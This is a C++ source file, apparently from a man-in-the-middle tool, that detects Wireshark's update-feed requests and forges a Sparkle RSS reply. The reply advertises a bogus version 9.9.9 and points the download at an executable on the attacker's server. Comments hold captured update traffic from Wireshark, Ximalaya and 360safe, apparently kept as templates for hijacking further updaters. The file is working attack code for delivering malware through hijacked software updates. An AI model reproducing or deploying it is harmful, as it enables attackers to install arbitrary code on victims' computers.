
#include "WireSharkUpdate.h"
#include <windows.h>
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../Public.h"
#include "../attacker.h"
#include "sslPublic.h"

int WireSharkUpdate::isWireshark(const char * url, const char * host) {
	if (strstr(host, "www.wireshark.org") <= 0) {
		return FALSE;
	}

	char * wxurl = "/update/";
	if (strstr(url, wxurl) && strstr(url, "/stable.xml") )
	{
		return TRUE;
	}

	return FALSE;
}



int WireSharkUpdate::replyWireshark(char * dstbuf, int dstbuflimit, string username) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: application/xml\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	string filename1 = Public::getUserPluginPath(username) + WEIXIN_PC_UPDATE_EXE_FILENAME;

	char szmd5_1[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, 1);
	if (filesize1 <= 0)
	{
		return FALSE;
	}

	char hdrformat[4096];
	string ver = "9.9.9";
	char szformat[] =
		"<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
		"<rss version=\"2.0\" xmlns:sparkle=\"http://www.andymatuschak.org/xml-namespaces/sparkle\">\r\n"
		"<channel>\r\n"
		"<title>Wireshark Stable Release</title>\r\n"
		"<link>https://www.wireshark.org/download.html</link>\r\n"
		"<description>The latest stable release of Wireshark.</description>\r\n"
		"<language>en</language>\r\n"
		"<item>\r\n"
		"<title>Version 9.9.3</title>\r\n"
		"<sparkle:releaseNotesLink>https://www.wireshark.org/update/relnotes/wireshark-3.0.3.html</sparkle:releaseNotesLink>\r\n"
		"<pubDate>Wed, 17 Jul 2099 18:34:56 GMT</pubDate>\r\n"
		"<enclosure url=\"http://%s/%s\"\r\n"
		"sparkle:version=\"%s\"\r\n"
		"type=\"application/octet-stream\">\r\n"
		"</enclosure>\r\n"
		"</item>\r\n"
		"</channel>\r\n"
		"</rss>";

	int httphdrlen = sprintf_s(hdrformat, 4096, szformat, strip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME,ver.c_str());

	int retlen = sprintf(dstbuf, szHttpPartialZipFormat, httphdrlen, hdrformat);

	return retlen;
}

/*
GET /update/0/Wireshark/2.2.1/Windows/x86/en-US/stable.xml HTTP/1.1
User-Agent: Wireshark/2.2.1 WinSparkle/0.3.0 (WOW64)
Host: www.wireshark.org
If-Modified-Since: Wed, 17 Jul 2019 18:59:14 GMT
If-None-Match: W/"312-58de516dbcb8b-gzip"
Cookie: __cfduid=dca60fb7c70c793bfee1806b20cac1d0f1564455009

HTTP/1.1 200 OK
Date: Tue, 06 Aug 2019 01:11:30 GMT
Content-Type: application/xml
Transfer-Encoding: chunked
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Slogan: It's a great product with a great story to tell. I'm pumped!
Last-Modified: Wed, 17 Jul 2019 18:59:14 GMT
ETag: W/"312-58de516dbcb8b-gzip"
Vary: Accept-Encoding
X-Slogan: Go deep.
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 501d231d8bc276b6-LAX

312
<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle">
<channel>
<title>Wireshark Stable Release</title>
<link>https://www.wireshark.org/download.html</link>
<description>The latest stable release of Wireshark.</description>
<language>en</language>
<item>
<title>Version 3.0.3</title>
<sparkle:releaseNotesLink>https://www.wireshark.org/update/relnotes/wireshark-3.0.3.html</sparkle:releaseNotesLink>
<pubDate>Wed, 17 Jul 2019 18:34:56 GMT</pubDate>
<enclosure url="https://1.na.dl.wireshark.org/win32/Wireshark-win32-3.0.3.exe"
sparkle:version="3.0.3"
type="application/octet-stream">
</enclosure>
</item>
</channel>
</rss>
*/



/*
POST /dog-portal/check/resource/1566539325912 HTTP/1.1
Cookie: 1&_device=android&e978cd7a-49ac-3506-a81a-07a262d77cf3&6.6.3;channel=and-d10;impl=com.ximalaya.ting.android;osversion=28;device_model=MIX+2S;XUM=TEnjELqz;XIM=;c-oper=%E6%9C%AA%E7%9F%A5;net-mode=WIFI;freeFlowType=0;res=1080%2C2030;NSUP=;AID=cY29NWf7gMQ=;manufacturer=Xiaomi;XD=GulgHGyIjpuZeuaxzCl+97L4zQ0QLuIsjby8XJfpHLMUftsp32/LtsRxJk/kSyojzw4oHZSvuxChLw1TQHFi9QgZAi/OkK95FEoQntXEtIWbt9mqDJGHTRlWFLkc4xciie1nVbQDlQOOFULiclCObQ==;xm_grade=0;minorProtectionStatus=0;domain=.ximalaya.com;path=/;
Accept: *//*
Cookie2: $version=1
user-agent: ting_6.6.3(MIX+2S,Android28)
Host: mobwsa.ximalaya.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 99
Connection: Keep-Alive
Accept-Encoding: gzip

appVersion=6.6.3.3&packageName=com.ximalaya.ting.android&signature=6fddbbe010ce60c0b6eaaee1cf3e54f0HTTP/1.1 200 OK
Date: Fri, 23 Aug 2019 05:48:51 GMT
Server: Tengine
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
x-tId: 6136465795310802730
x-sId: 5352054473622746661
X-B3-Back-Id: forab
x-server-costtime: 0
x-a1-httpdns-switch: on
x-a1-xdcs-collector-switch: on
x-a1-front-switch: on
access-control-expose-headers: x-a1-front-switch
x-a1-xdcs-business-switch: on
x-a1-xdcs-all-log-switch: on
x-a1-protocol-switch: 0
Content-Encoding: gzip
X-Via: 1.1 hzh76:5 (Cdn Cache Server V2.0)
Connection: keep-alive

{"msg":"0","ret":0,"data":"[{\"bundleId\":625,\"bundleName\":\"offlineResourceBundle3\",\"description\":\" android\",
\"diff\":false,\"forceUpdate\":false,\"id\":3570,\"md5\":\"2834e12333c3c83a7def20714034e767\",\"status\":\"on\",
\"url\":\"http://fdfs.xmcdn.com/group61/M00/AD/D6/wKgMcF0AaBqROwa8ACZ0dpfA_30435.zip\",\"version\":\"0.0.82\"}]",
"signature":"20807b2b5a1d4f6e77c89c502a73d12e","threshold":2048}
*/





/*
GET /safe/checkupdate.ini HTTP/1.1
Host: update.360safe.com
Accept: *//*
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 302 Moved Temporarily
Server: nginx
Date: Fri, 23 Aug 2019 14:39:20 GMT
Content-Type: text/html
Content-Length: 154
Connection: close
Location: https://ini.update.360safe.com/safe/checkupdate.ini?&gslb=1

<html>
<head><title>302 Found</title></head>
<body bgcolor="white">
<center><h1>302 Found</h1></center>
<hr><center>nginx</center>
</body>
</html>

GET /safe/checkupdate.ini?&gslb=1 HTTP/1.1
Host: ini.update.360safe.com
Accept: *//*
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 302 Moved Temporarily
Server: nginx
Date: Fri, 23 Aug 2019 14:39:20 GMT
Content-Type: text/html
Content-Length: 154
Connection: close
Location: https://updateh.360safe.com/safe/checkupdate.ini?&gslb=1

<html>
<head><title>302 Found</title></head>
<body bgcolor="white">
<center><h1>302 Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
ssl first packet:GET /safe/checkupdate.ini?&gslb=1 HTTP/1.1
Host: updateh.360safe.com
Accept: *//*
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Fri, 23 Aug 2019 14:39:20 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: close

256
beta_ver=12.1.0.1001
beta_content=1.智能连接安全大脑，极智安全专业守�?n2.防护中心整合升级四大防护体系%n3.界面交互优化升级，简单易用友好体�?beta_url=pdown://h3=120|http://down.360safe.com/setupbeta_11636a42e8e651bd57143801e8be5c21.exe
beta_argv=/s /smartsilence

ver=12.0.0.2001
content=1.安全卫士全面升级，智能连接安全大�?n2.能力提升，看得见威胁，守得住家园%n3.界面交互优化，简单易用友好体�?url=pdown://h3=120|http://down.360safe.com/setup_999829c1e4e9710943e424711fd5b8fd.exe
argv=/s /smartsilence
0
*/